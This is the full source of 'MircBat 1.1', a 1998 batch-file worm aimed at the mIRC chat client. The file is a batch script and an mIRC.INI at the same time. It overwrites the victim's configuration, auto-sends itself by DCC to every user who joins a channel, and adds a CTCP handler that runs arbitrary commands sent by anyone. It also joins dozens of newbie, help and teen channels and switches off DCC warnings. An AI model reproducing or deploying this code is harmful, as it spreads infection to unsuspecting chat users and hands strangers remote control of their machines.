@ECHO OFF

REM ==========================================
REM MircBat 1.1 / Oct-Nov-1998 by Dark Weenie.
REM ==========================================

IF NOT EXIST C:\MIRC\MIRC.INI GOTO Exit
IF EXIST C:\MIRC\AUTOEXEC.BAT GOTO Exit

DEL C:\MIRC\MIRC.INI > NUL

COPY AUTOEXEC.BAT C:\MIRC\AUTOEXEC.BAT > NUL
COPY AUTOEXEC.BAT C:\MIRC\MIRC.INI > NUL

GOTO Exit

[script]
n0=ON !*:JOIN:#: .DCC SEND $NICK C:\MIRC\AUTOEXEC.BAT

n1=CTCP *:MB:*: .$2- | .HALT

[channels]
n0=#beginner
n1=#casual
n2=#chataway
n3=#chatterz
n4=#chat-world
n5=#chatzone
n6=#cheers
n7=#CyberCafe
n8=#CyberChat
n9=#CyberFriends
n10=#CyberParty
n11=#Family_Chat
n12=#FunChat
n13=#funfactory
n14=#Funshack The Fun and Friendly, All Welcome, Funchannel
n15=#Giggles
n16=#help
n17=#HelpDesk
n18=#hottub
n19=#IRCAddicts
n20=#ircbar
n21=#irchelp General IRC Help
n22=#irclub
n23=#ircnewbies IRC/mIRC Questions Answered with a Smile :-)

n24=#ircpassage
n25=#ircsupport
n26=#IRCWavPlayers mIRC Wavs & Ascii
n27=#Loonybin
n28=#mIRC Ask mIRC Questions Here! (no chatting)
n29=#mIRC_Colors
n30=#mIRC_Lounge
n31=#mIRC_Rainbow mIRC Help, Colours, and Popups!
n32=#mIRC_Wavs'N'Txt
n33=#mIRC4Dummies
n34=#mIRCAide
n35=#mIRCHelp mIRC Questions Welcomed! :)
n36=#mIRCInTro
n37=#mIRCScripts
n38=#mIRCSetUp
n39=#mIRCsupport
n40=#new2irc
n41=#new2mIRC
n42=#new2mIRC3
n43=#newbiehelp
n44=#newbies
n45=#PartyHouse Party Party Party!

n46=#PlanetChat
n47=#PopInn Friendly Chat, Popups & Colours help
n48=#SpeakEasy
n49=#Speaker's_corner
n50=#teen
n51=#teens
n52=#teenzone
n53=#TheChatterBox
n54=#UserGuide
n55=#Wasteland
n56=#Windows95
n57=#Winsock
n58=#Worldchat

[warn]
fserve=off
dcc=off

[about]
show=iamweasel

[windows]
main=100,600,75,450,0,1,0

[dde]
ServerStatus=on
ServiceName=mIRC

[pfiles]
n0=popups.ini
n1=popups.ini
n2=popups.ini
n3=popups.ini
n4=popups.ini

[dccserver]

n0=1,59,1,1,1,0

[ident]
active=yes
userid=mircbat
system=UNIX
port=113

[socks]
Enabled=no
Port=1080
Method=4
dccs=no

[wizard]
warning=2

[fileserver]
Warning=Off

[extensions]
n0=defaultEXTDIR:download\
n1=*.wav,*.midEXTDIR:sounds\

[text]
commandchar=/
linesep=-

[files]
servers=servers.ini
emailer=
finger=finger.txt
urls=urls.ini
addrbk=addrbk.ini

[mirc]
user=mircbat
email=mircbat
nick=mircbat
anick=mircbat
host=Random US DALnet serverSERVER:irc.dal.net:7000GROUP:1

[dirs]
logdir=logs\
waves=sounds\
midis=sounds\

[colours]
n0=0,6,4,5,2,3,3,3,3,3,3,1,5,2,6,1,3,2,3,5,1,0,1,0,1

[afiles]
n0=aliases.ini

[rfiles]
n0=remote.ini
n1=remote.ini
n2=mirc.ini

[options]
n0=0,1,0,0,0,0,300,0,0,0,1,0,0,0,1,0,0,1,0,0,512,0,1,0,0,0,0
n1=5,50,0,0,0,0,0,0,0,1,0,1,0,0,1,1,1,1,0,0,1,1,1,0,5,0,0
n2=0,1,0,1,1,1,1,1,0,60,120,0,0,1,1,0,1,1,0,120,20,10,0,1,1,0,0
n3=500,0,0,0,0,0,1,1,1,1,0,1,0,0,0,0,3,1,0,1,0,0,0,0,1,1,2,0,0
n4=1,0,1,1,0,3,999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,1,1,1,5000

n5=1,1,1,1,1,1,1,1,1,1,6667,0,0,0,1,0,1,0,300,10,4,0,1,24,0,0,1

:Exit

Metaphase 1998